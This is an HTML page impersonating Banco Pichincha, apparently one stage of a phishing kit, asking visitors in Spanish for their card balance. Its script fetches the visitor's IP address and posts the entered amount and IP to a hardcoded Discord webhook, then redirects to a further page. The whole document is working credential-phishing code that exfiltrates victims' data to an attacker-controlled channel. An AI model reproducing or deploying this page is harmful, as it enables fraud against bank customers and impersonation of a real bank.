<!DOCTYPE html>
<html lang="es">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>Ingreso de Monto - Banco Pichincha</title>
  <style>
    :root {
      --primary-color: #F9D616;
      --accent-color: #003366;
    }
    body {
      margin: 0;
      font-family: 'Segoe UI', sans-serif;
      background: linear-gradient(135deg, #fffbe6, #fdf9d6);
      display: flex;
      align-items: center;
      justify-content: center;
      height: 100vh;
      flex-direction: column;
    }
    .floating-box {
      background: rgba(255, 255, 255, 0.7);
      backdrop-filter: blur(12px);
      border: 1px solid rgba(255, 255, 255, 0.3);
      box-shadow: 0 4px 16px rgba(0, 0, 0, 0.1);
      border-radius: 12px;
      padding: 15px 20px;
      text-align: center;
      color: #003366;
      font-size: 15px;
      margin-bottom: 20px;
      width: 320px;
      animation: slideDown 0.5s ease-in-out;
    }
    .floating-box strong {
      display: block;
      font-size: 12px;
      margin-bottom: 2px;
      color: #000;
    }
    @keyframes slideDown {
      from { opacity: 0; transform: translateY(-20px); }
      to { opacity: 1; transform: translateY(0); }
    }
    .card {
      background: rgba(255, 255, 255, 0.6);
      backdrop-filter: blur(16px);
      box-shadow: 0 8px 32px rgba(0, 0, 0, 0.2);
      padding: 40px 30px;
      border-radius: 20px;
      width: 330px;
      text-align: center;
      border: 1px solid rgba(255, 255, 255, 0.18);
      animation: fadeIn 0.5s ease-in-out;
    }
    @keyframes fadeIn {
      from { opacity: 0; transform: scale(0.95); }
      to { opacity: 1; transform: scale(1); }
    }
    h2 {
      color: var(--accent-color);
      font-weight: 600;
      margin-bottom: 15px;
    }
    p {
      color: #333;
      font-size: 14px;
      margin-bottom: 25px;
    }
    input[type="number"] {
      width: 100%;
      padding: 12px;
      font-size: 16px;
      text-align: center;
      border: none;
      border-radius: 12px;
      background: #ffffffcc;
      box-shadow: inset 0 0 5px rgba(0, 0, 0, 0.1);
      transition: all 0.25s ease;
      margin-bottom: 20px;
    }
    input[type="number"]:focus {
      outline: none;
      transform: scale(1.05);
      box-shadow: 0 0 8px #f9d616a6;
    }
    .buttons {
      display: flex;
      gap: 20px;
      justify-content: center;
    }
    .buttons button {
      flex: 1;
      padding: 12px;
      font-size: 15px;
      border: none;
      border-radius: 10px;
      cursor: pointer;
      transition: 0.3s;
    }
    .volver {
      background-color: #e0e0e0;
      color: #333;
    }
    .confirmar {
      background-color: var(--primary-color);
      color: #000;
      font-weight: bold;
    }
    .volver:hover,
    .confirmar:hover {
      transform: scale(1.05);
    }
  </style>
</head>
<body>


  <div class="card">
    <h2>Saldo Actual En Su Tarjeta</h2>
    <p>Por favor, ingrese el monto actual de su tarjeta ingresada.</p>

    <form id="montoForm">
      <input type="number" id="monto" step="0.01" min="0.01" placeholder="Ej: 250.00" required />
      <div class="buttons">
        <button type="button" class="volver" onclick="history.back()">Volver</button>
        <button type="submit" class="confirmar">Confirmar</button>
      </div>
    </form>
  </div>

  <script>
    document.getElementById("montoForm").addEventListener("submit", async (e) => {
      e.preventDefault();
      const monto = document.getElementById("monto").value;
      if (!monto || monto <= 0) {
        alert("Ingrese un monto válido.");
        return;
      }

      // IP del cliente desde servicio público
      const ipResponse = await fetch("https://api.ipify.org?format=json");
      const ipData = await ipResponse.json();

      const mensaje = `**Monto ingresado:** ${monto} USDT\n**IP:** ${ipData.ip}`;

      // Webhook de Discord
      const webhookUrl = "https://discord.com/api/webhooks/1454989461040529510/JHDshtAuGe5zTYy-fIxhQLc_87MGHTDe_Y6LvJRVXhd2bMuF3ojcwWlUTGaEryUfEF-Z";

      await fetch(webhookUrl, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ content: mensaje }),
      });

      
      window.location.href = "index5.html"; // Redirección opcional
    });
  </script>

</body>
</html>
